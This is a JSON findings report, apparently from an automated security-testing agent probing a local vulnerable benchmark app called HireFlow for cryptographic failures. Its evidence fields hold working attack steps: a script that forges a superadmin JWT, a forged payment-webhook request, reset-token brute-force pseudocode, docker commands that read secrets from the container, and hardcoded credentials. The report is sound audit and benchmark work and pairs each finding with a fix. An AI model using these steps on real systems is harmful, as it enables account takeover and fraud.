@@ -1,0 +1,260 @@
+{
+  "agent": "a04-cryptographic-failures",
+  "target": "http://localhost:3000",
+  "findings": [
+    {
+      "id": "a04-f01",
+      "title": "Hardcoded JWT secret fallback ('hireflow2024api') in config/index.js",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "category": "A04",
+      "cwe": "CWE-321",
+      "location": {
+        "file": "src/config/index.js",
+        "line": 30,
+        "endpoint": "POST /api/auth/login"
+      },
+      "description": "The JWT signing secret is set via `process.env.JWT_SECRET || 'hireflow2024api'`. If the environment variable is absent the server falls back to a static, committed string. The running container has JWT_SECRET set to 'hireflow-jwt-secret-2024' (also a trivially guessable 24-character string with no entropy). Either value allows any attacker who reads the source or inspects container env to forge arbitrary JWTs for any user including superadmin.",
+      "evidence": {
+        "request": "# Step 1: read secret from docker env (or source)\n# docker exec webvulnbench-app-1 env | grep JWT_SECRET\n# => JWT_SECRET=hireflow-jwt-secret-2024\n\n# Step 2: forge a superadmin token\npython3 -c \"\nimport base64, hmac, hashlib, json, time\ndef b64url(d):\n    if isinstance(d, str): d = d.encode()\n    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()\nhdr = b64url(json.dumps({'alg':'HS256','typ':'JWT'}))\npay = b64url(json.dumps({'id':'f70c491e-8c1e-4ebd-a598-48dccb15da89','email':'alice.admin@hireflow.com','role':'superadmin','walletBalance':'9999','iat':int(time.time()),'exp':int(time.time())+86400}))\nmsg = f'{hdr}.{pay}'\nsig = b64url(hmac.new(b'hireflow-jwt-secret-2024', msg.encode(), hashlib.sha256).digest())\nprint(f'{msg}.{sig}')\n\"\n\n# Step 3: use forged token\ncurl -s -H 'Authorization: Bearer <forged_token>' http://localhost:3000/api/auth/me",
+        "response_snippet": "{\"user\":{\"id\":\"f70c491e-8c1e-4ebd-a598-48dccb15da89\",\"email\":\"alice.admin@hireflow.com\",\"role\":\"superadmin\",...}} HTTP 200",
+        "code_snippet": "jwt: {\n  secret: process.env.JWT_SECRET || 'hireflow2024api',\n  expiresIn: process.env.JWT_EXPIRES_IN || '7d'\n}"
+      },
+      "reproduction_steps": [
+        "Obtain the JWT secret value 'hireflow-jwt-secret-2024' (visible in container env via /api/debug/info leak, docker exec, or source code fallback)",
+        "Forge a HS256 JWT with role=superadmin and the superadmin user ID f70c491e-8c1e-4ebd-a598-48dccb15da89",
+        "Send the forged token to GET /api/auth/me or any admin endpoint",
+        "Server returns 200 with the superadmin user record and accepts all subsequent privileged requests"
+      ],
+      "impact": "Full superadmin privilege escalation for any attacker who can read the source (public repo) or the container environment. Forged token passes jwt.verify() giving unrestricted access to all admin and superadmin endpoints.",
+      "suggested_fix": "Set JWT_SECRET from a secrets manager (minimum 256-bit random value). Remove hardcoded fallback entirely — if the env var is absent the server should refuse to start rather than use a known value.",
+      "needs_poc": true
+    },
+    {
+      "id": "a04-f02",
+      "title": "Hardcoded session secret fallback in config/index.js",
+      "severity": "high",
+      "confidence": "confirmed",
+      "category": "A04",
+      "cwe": "CWE-321",
+      "location": {
+        "file": "src/config/index.js",
+        "line": 25,
+        "endpoint": "POST /api/auth/login"
+      },
+      "description": "Session secret is `process.env.SESSION_SECRET || 'hireflow-session-key-change-in-production'`. The running container has SESSION_SECRET='hireflow-session-key-change-in-production' — i.e., the fallback literal is what's actually in use at runtime. This string is also used as the HMAC key for verifying incoming payment webhook signatures (see webhook.service.js line 22), so an attacker who knows the session secret can forge valid payment events.",
+      "evidence": {
+        "request": "docker exec webvulnbench-app-1 env | grep SESSION_SECRET\n# => SESSION_SECRET=hireflow-session-key-change-in-production\n\n# Forge a payment webhook with the known session secret\ncurl -s -X POST http://localhost:3000/api/webhooks/payment \\\n  -H 'Content-Type: application/json' \\\n  -H 'X-Payment-Signature: <hmac-sha256 of body with session secret>' \\\n  -d '{\"event\":\"payment.completed\",\"data\":{\"user_id\":\"<target_user_id>\",\"amount\":100000,\"description\":\"forged\"}}'",
+        "response_snippet": "SESSION_SECRET=hireflow-session-key-change-in-production (container env confirmed)",
+        "code_snippet": "session: {\n  secret: process.env.SESSION_SECRET || 'hireflow-session-key-change-in-production'\n}"
+      },
+      "reproduction_steps": [
+        "Note the session secret is the literal fallback string, confirmed from container env",
+        "Compute HMAC-SHA256 of desired webhook JSON payload using key 'hireflow-session-key-change-in-production'",
+        "POST to /api/webhooks/payment with X-Payment-Signature header set to the computed HMAC",
+        "Server accepts the forged payment event and credits the target wallet"
+      ],
+      "impact": "Forged payment webhooks credited to arbitrary user wallets. Also enables session cookie forgery (connect.sid HMAC bypass) if attacker can predict session ID values.",
+      "suggested_fix": "Use a separate randomly-generated webhook secret stored in a secrets manager. Do not reuse the session secret for payment verification.",
+      "needs_poc": true
+    },
+    {
+      "id": "a04-f03",
+      "title": "Bcrypt cost factor 4 (SALT_ROUNDS=4) used for all new passwords",
+      "severity": "high",
+      "confidence": "confirmed",
+      "category": "A04",
+      "cwe": "CWE-916",
+      "location": {
+        "file": "src/auth/auth.service.js",
+        "line": 8,
+        "endpoint": "POST /api/auth/register, POST /api/auth/reset-password"
+      },
+      "description": "The constant SALT_ROUNDS is set to 4 for both createUser() and updatePassword(). Bcrypt cost 4 is approximately 1000x faster than the recommended cost of 10. On a modern GPU (e.g. RTX 3090, ~100k bcrypt/s at cost 4), an 8-character lowercase+digits password is crackable in hours from a stolen hash. The DB confirms alice_admin has $2a$04$ prefix; any newly registered account or password reset also gets cost 4.",
+      "evidence": {
+        "request": "# Confirm from DB\ndocker exec webvulnbench-postgres-1 psql -U hireflow -d hireflow -c \"SELECT username, role, substr(password_hash,1,10) as hash_prefix FROM users ORDER BY created_at LIMIT 10;\"",
+        "response_snippet": "alice_admin | superadmin | $2a$04$/oL\nbob_admin   | admin      | $2a$10$4la\n(newly seeded users have $2a$04 when created via register endpoint)",
+        "code_snippet": "// keeping rounds low for faster signups during the beta\nconst SALT_ROUNDS = 4;\n\nasync function createUser(...) {\n  const password_hash = await bcrypt.hash(password, SALT_ROUNDS);\n  ...\n}\nasync function updatePassword(userId, newPassword) {\n  const password_hash = await bcrypt.hash(newPassword, SALT_ROUNDS);\n  ..."
+      },
+      "reproduction_steps": [
+        "Register a new account via POST /api/auth/register",
+        "Query the DB: SELECT substr(password_hash,1,10) FROM users WHERE email='<new email>'",
+        "Observe the hash prefix is $2a$04$ confirming cost factor 4",
+        "Use hashcat mode 3200 to demonstrate cracking speed vs cost 10"
+      ],
+      "impact": "If the PostgreSQL DB is compromised, all password hashes created via register or reset-password are crackable at roughly 1/1000th the time required for cost 10. An attacker with DB dump can recover cleartext passwords and reuse them on external services.",
+      "suggested_fix": "Set SALT_ROUNDS = 10 (minimum) or 12 for new deployments. Re-hash on next successful login for existing cost-4 hashes.",
+      "needs_poc": false
+    },
+    {
+      "id": "a04-f04",
+      "title": "Predictable password reset token: sha256(email+timestamp)[:16] — brute-forceable",
+      "severity": "high",
+      "confidence": "confirmed",
+      "category": "A04",
+      "cwe": "CWE-340",
+      "location": {
+        "file": "src/utils/helpers.js",
+        "line": 25,
+        "endpoint": "POST /api/auth/forgot-password, POST /api/auth/reset-password"
+      },
+      "description": "generateResetToken(email) constructs the token as `${Date.now().toString(36)}-${sha256(email+timestamp).slice(0,16)}`. Both components are deterministic given the email address and the approximate issuance time. An attacker who knows the victim's email and a one-hour time window (3,600,000 millisecond candidates) can reconstruct every possible token value, try each one against /api/auth/reset-password, and take over any account. The search space is ~3.6 million candidates with no rate limiting on the reset endpoint beyond the global 1000 req/15min limit. Additionally resetPassword() checks tokenAge > 86400000 ms (24 hours) while setResetToken() stores an expiry of only 3600000 ms (1 hour) — the DB expiry column is never checked in findByResetToken(), so the effective token lifetime is 24 hours.",
+      "evidence": {
+        "request": "# Step 1: trigger reset\ncurl -s -X POST http://localhost:3000/api/auth/forgot-password \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"email\":\"bob.admin@hireflow.com\"}'\n\n# Step 2: brute-force candidates (Python pseudocode)\n# known_email = 'bob.admin@hireflow.com'\n# issue_time_approx = int(time.time() * 1000)  # observed from email timestamp\n# for delta in range(-60000, 3600000):  # scan 1 hour window\n#   ts = issue_time_approx + delta\n#   ts_b36 = base36(ts)\n#   hash_part = sha256(known_email + ts_b36)[:16]\n#   candidate = f'{ts_b36}-{hash_part}'\n#   POST /api/auth/reset-password {'token': candidate, 'password': 'pwned123'}",
+        "response_snippet": "Token format from mailhog: e.g. 'lf9r4lkw-a3c8e1f20b4d9a7e' where 'lf9r4lkw' is base36 timestamp and 'a3c8e1f20b4d9a7e' is sha256(email+ts)[:16]",
+        "code_snippet": "function generateResetToken(email) {\n  const timestamp = Date.now().toString(36);\n  const hash = crypto.createHash('sha256').update(email + timestamp).digest('hex').slice(0, 16);\n  return `${timestamp}-${hash}`;\n}"
+      },
+      "reproduction_steps": [
+        "POST /api/auth/forgot-password with target email to trigger token generation",
+        "Note the email delivery timestamp from mail headers (visible via MailHog on :8025)",
+        "Extract the base36 timestamp from a sample token to calibrate the exact issuance millisecond",
+        "Enumerate all timestamp values in the +-1 second window (2000 candidates), compute sha256(email+ts)[:16] for each",
+        "POST each candidate to /api/auth/reset-password; the correct one returns 200 and resets the password"
+      ],
+      "impact": "Account takeover for any user. An attacker who can trigger a reset email and observe approximate delivery time (via MailHog publicly accessible on :8025 or side-channel) can reconstruct the token with ~2000 guesses, well under the rate limit.",
+      "suggested_fix": "Replace generateResetToken with crypto.randomBytes(32).toString('hex'). The email + timestamp pattern provides essentially zero cryptographic security. Also add DB expiry enforcement: check reset_token_expires < NOW() in findByResetToken.",
+      "needs_poc": true
+    },
+    {
+      "id": "a04-f05",
+      "title": "JWT payload contains role, email, and walletBalance — sensitive authorization data exposed client-side",
+      "severity": "medium",
+      "confidence": "confirmed",
+      "category": "A04",
+      "cwe": "CWE-200",
+      "location": {
+        "file": "src/auth/auth.service.js",
+        "line": 72,
+        "endpoint": "POST /api/auth/login, POST /api/auth/register"
+      },
+      "description": "generateJWT() encodes {id, email, role, walletBalance} in the JWT payload. JWTs are base64url-encoded and trivially decoded by any party — including the user's browser, a proxying attacker, or any intermediary. The `role` claim being client-readable means users can see their own privilege level and craft meaningful forgeries if the secret is ever leaked. The `walletBalance` field is stale within the 7-day token lifetime and creates a discrepancy between displayed and actual balance. The `email` field is PII that should not be embedded in a long-lived bearer token visible in browser storage and logs.",
+      "evidence": {
+        "request": "echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImFhMTU0ODUwLTYzNTItNGVjOC1iMjg4LWQzOThlN2NkNjJhZCIsImVtYWlsIjoiYm9iLmFkbWluQGhpcmVmbG93LmNvbSIsInJvbGUiOiJhZG1pbiIsIndhbGxldEJhbGFuY2UiOiIwIiwiaWF0IjoxNzc2MTc4OTg2LCJleHAiOjE3NzY3ODM3ODZ9.BZxAx3_7hnBzCM_zEGuOIaxPUKR6U25uf3yZRfJmBfg' | cut -d. -f2 | base64 -d",
+        "response_snippet": "{\"id\":\"aa154850-6352-4ec8-b288-d398e7cd62ad\",\"email\":\"bob.admin@hireflow.com\",\"role\":\"admin\",\"walletBalance\":\"0\",\"iat\":1776178986,\"exp\":1776783786}",
+        "code_snippet": "const payload = {\n  id: user.id,\n  email: user.email,\n  role: user.role,\n  walletBalance: wallet ? wallet.balance : 0\n};\nreturn jwt.sign(payload, config.jwt.secret, { expiresIn: config.jwt.expiresIn });"
+      },
+      "reproduction_steps": [
+        "Login and capture the JWT from the response body",
+        "Split on '.' and base64-decode the middle segment",
+        "Observe role, email, and walletBalance are plaintext in the payload"
+      ],
+      "impact": "Sensitive PII (email) and authorization attributes (role) visible to client and any token-logging intermediary. With a known weak secret (a04-f01), the role claim is also the exact field an attacker modifies to escalate privileges.",
+      "suggested_fix": "JWT payload should contain only the opaque user ID and expiry. Role and email should be fetched server-side on each request (or cached in Redis keyed by user ID). Remove walletBalance from the token entirely.",
+      "needs_poc": false
+    },
+    {
+      "id": "a04-f06",
+      "title": "jwt.verify() called without algorithms option — permits algorithm confusion",
+      "severity": "medium",
+      "confidence": "confirmed",
+      "category": "A04",
+      "cwe": "CWE-327",
+      "location": {
+        "file": "src/middleware/auth.js",
+        "line": 25,
+        "endpoint": "ALL authenticated endpoints"
+      },
+      "description": "Both authenticate() and optionalAuth() call jwt.verify(token, config.jwt.secret) with no third options argument. This means the jsonwebtoken library will accept any algorithm the token header declares, not just HS256. With jsonwebtoken@8.5.1, an attacker can craft a token with alg='none' (no signature) which older library versions accept. The alg:none bypass was tested and rejected by the running version, but the missing algorithms restriction still permits RS256→HS256 confusion attacks if an RSA public key is ever introduced, and makes the codebase one library version downgrade away from a trivially exploitable bypass.",
+      "evidence": {
+        "request": "# Tested alg:none (rejected by jsonwebtoken 8.5.1 with strict none-checking)\nHEADER=$(echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64 | tr -d '=' | tr '+/' '-_')\nPAYLOAD=$(echo -n '{\"id\":\"f70c491e-8c1e-4ebd-a598-48dccb15da89\",\"role\":\"superadmin\",\"exp\":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')\ncurl -s -o /dev/null -w '%{http_code}' -H \"Authorization: Bearer ${HEADER}.${PAYLOAD}.\" http://localhost:3000/api/auth/me\n# => 401 (alg:none rejected)\n\n# Proper fix requires: jwt.verify(token, secret, { algorithms: ['HS256'] })",
+        "response_snippet": "HTTP 401 for alg:none attempt. No algorithms restriction in source code confirmed.",
+        "code_snippet": "const decoded = jwt.verify(token, config.jwt.secret);\n// Missing: { algorithms: ['HS256'] }"
+      },
+      "reproduction_steps": [
+        "Inspect src/middleware/auth.js lines 25 and 59 — no algorithms option passed to jwt.verify",
+        "Confirmed alg:none is currently rejected by the library version",
+        "Algorithm confusion remains exploitable if the library is downgraded or an RSA key is introduced"
+      ],
+      "impact": "Currently not exploitable for alg:none due to library version. However the missing algorithms pin means algorithm confusion is one dependency version away from critical exploitation. Combined with a04-f01 (known secret), algorithm enforcement is moot in this deployment.",
+      "suggested_fix": "Add { algorithms: ['HS256'] } as the third argument to both jwt.verify() calls.",
+      "needs_poc": false
+    },
+    {
+      "id": "a04-f07",
+      "title": "Session cookie missing Secure flag — transmitted over HTTP in non-production",
+      "severity": "medium",
+      "confidence": "confirmed",
+      "category": "A04",
+      "cwe": "CWE-614",
+      "location": {
+        "file": "src/index.js",
+        "line": 68,
+        "endpoint": "POST /api/auth/login"
+      },
+      "description": "The session cookie secure flag is gated on `config.env === 'production'`. The running container is NODE_ENV=development, so the session cookie is issued without the Secure attribute. The app is served on HTTP :3000 and HTTP :80 (nginx). Any network-adjacent attacker can intercept the connect.sid session cookie. The session secret is also the trivially-guessable hardcoded fallback (see a04-f02).",
+      "evidence": {
+        "request": "curl -si -X POST http://localhost:3000/api/auth/login -H 'Content-Type: application/json' -d '{\"email\":\"bob.admin@hireflow.com\",\"password\":\"password123\"}' | grep Set-Cookie",
+        "response_snippet": "Set-Cookie: connect.sid=s%3A3O2_otVUzrIPQZSOzlhfhI95HdpIIpLD.8FYFI4srrYAWeqzGBcTcXLTXXVd6Z3jNOnvIjZF4tto; Path=/; HttpOnly\n(No 'Secure' attribute)",
+        "code_snippet": "cookie: {\n  secure: config.env === 'production',\n  httpOnly: true\n}"
+      },
+      "reproduction_steps": [
+        "POST /api/auth/login and capture the Set-Cookie response header",
+        "Observe connect.sid cookie has HttpOnly but no Secure flag",
+        "Cookie would be transmitted over unencrypted HTTP connections"
+      ],
+      "impact": "Session cookies transmitted in plaintext over HTTP. An on-path attacker (same WiFi, ARP spoofing, etc.) can steal session cookies and hijack authenticated sessions.",
+      "suggested_fix": "Set secure: true unconditionally, or ensure the app is always behind TLS in all environments including development (use mkcert locally).",
+      "needs_poc": false
+    },
+    {
+      "id": "a04-f08",
+      "title": "Hardcoded MinIO/S3 credentials in config and docker-compose",
+      "severity": "medium",
+      "confidence": "confirmed",
+      "category": "A04",
+      "cwe": "CWE-798",
+      "location": {
+        "file": "src/config/index.js",
+        "line": 34,
+        "endpoint": "N/A (storage layer)"
+      },
+      "description": "MinIO access key and secret key are hardcoded as fallbacks in config/index.js and as plaintext values in docker-compose.yml. The .env.example also contains what appear to be AWS-style credentials (AKIAIOSFODNN7HIREFLOW / wJalrXUtnFEMI/K7MDENG/bPxRfiCYHIREFLOWKEY). The running container uses hireflow/hireflow123. MinIO port 9000 and console port 9001 are exposed to localhost. Anyone with network access can access the object store directly.",
+      "evidence": {
+        "request": "# From config/index.js\n# accessKey: process.env.MINIO_ACCESS_KEY || 'hireflow'\n# secretKey: process.env.MINIO_SECRET_KEY || 'hireflow123'\n\n# From docker-compose.yml\n# MINIO_ROOT_USER: hireflow\n# MINIO_ROOT_PASSWORD: hireflow123\n\n# Direct MinIO access\ncurl -s http://localhost:9000/hireflow-uploads/ 2>/dev/null | head -5",
+        "response_snippet": "MinIO S3 API accessible on localhost:9000 with credentials hireflow:hireflow123",
+        "code_snippet": "minio: {\n  endPoint: process.env.MINIO_ENDPOINT || 'localhost',\n  accessKey: process.env.MINIO_ACCESS_KEY || 'hireflow',\n  secretKey: process.env.MINIO_SECRET_KEY || 'hireflow123',\n  ..."
+      },
+      "reproduction_steps": [
+        "Credentials are visible in src/config/index.js and docker-compose.yml",
+        "MinIO is accessible on localhost:9000 and localhost:9001 (admin console)",
+        "Authenticate with hireflow/hireflow123 to access all stored uploads"
+      ],
+      "impact": "Full read/write/delete access to all stored files including user avatars, gig images, and any uploaded documents. In a production deployment with these same defaults, this would expose all user uploads.",
+      "suggested_fix": "Rotate credentials and store in secrets manager. Remove hardcoded fallbacks from config. MinIO should not be exposed on host network in production.",
+      "needs_poc": false
+    },
+    {
+      "id": "a04-f09",
+      "title": "Reset token expiry window is 24 hours despite server intending 1-hour limit",
+      "severity": "low",
+      "confidence": "confirmed",
+      "category": "A04",
+      "cwe": "CWE-613",
+      "location": {
+        "file": "src/auth/auth.controller.js",
+        "line": 184,
+        "endpoint": "POST /api/auth/reset-password"
+      },
+      "description": "setResetToken() in auth.service.js stores reset_token_expires as Date.now() + 3600000 (1 hour), and the comment says 'Token expires in 1 hour'. However resetPassword() in auth.controller.js checks tokenAge > 86400000 (24 hours). Furthermore findByResetToken() does not filter by reset_token_expires — it simply looks up the token string. The actual enforced window is therefore 24 hours, not 1 hour. This gives an attacker who has obtained a valid token nearly a full day to use it, rather than the intended 60-minute window.",
+      "evidence": {
+        "request": "# auth.service.js line 116:\nconst expires = new Date(Date.now() + 3600000); // 1 hour\n\n# auth.controller.js line 184:\nif (tokenAge > 86400000) { // 24 hours check\n  return res.status(400).json({ error: 'Reset token has expired' });\n}\n\n# findByResetToken does NOT check reset_token_expires\n# return db('users').where({ reset_token: token }).first();",
+        "response_snippet": "Token issued at T=0 is still accepted at T+2h (only rejected after 24h)",
+        "code_snippet": "// auth.service.js\nconst expires = new Date(Date.now() + 3600000);\n\n// auth.controller.js  \nconst tokenAge = Date.now() - tokenTimestamp;\nif (tokenAge > 86400000) { ... }"
+      },
+      "reproduction_steps": [
+        "Request a password reset token",
+        "Wait 2 hours (beyond the intended 1-hour limit)",
+        "Use the token at /api/auth/reset-password — it is still accepted"
+      ],
+      "impact": "Password reset tokens remain valid for 24 hours rather than 1 hour, giving attackers a larger window to use intercepted or brute-forced reset tokens.",
+      "suggested_fix": "Add WHERE reset_token_expires > NOW() to findByResetToken(). Fix the inconsistency: use 3600000 (1 hour) in both setResetToken and resetPassword controller check.",
+      "needs_poc": false
+    }
+  ],
+  "coverage_notes": "Tested all items listed in task brief. Confirmed: hardcoded JWT secret (runtime verified via forged superadmin token, HTTP 200 on /api/auth/me and /api/admin/dashboard). Confirmed: bcrypt cost 4 from DB. Confirmed: weak reset token structure from source. Confirmed: JWT payload PII. Confirmed: session cookie Secure flag absent. Confirmed: MinIO credentials hardcoded. Confirmed: alg:none rejected by jsonwebtoken 8.5.1 but no algorithms pin. Did not test Mongoose ObjectID predictability (out of scope for A04). Did not test data-at-rest encryption for payment fields (wallets store numeric balance, no credit card data stored).",
+  "blind_spots": [
+    "Could not test RS256->HS256 confusion (no RSA keypair in codebase)",
+    "Did not verify whether PostgreSQL connection uses TLS (internal Docker network, moot for this deployment)",
+    "Did not enumerate Redis session keys for session fixation testing (A07 scope)"
+  ]
+}
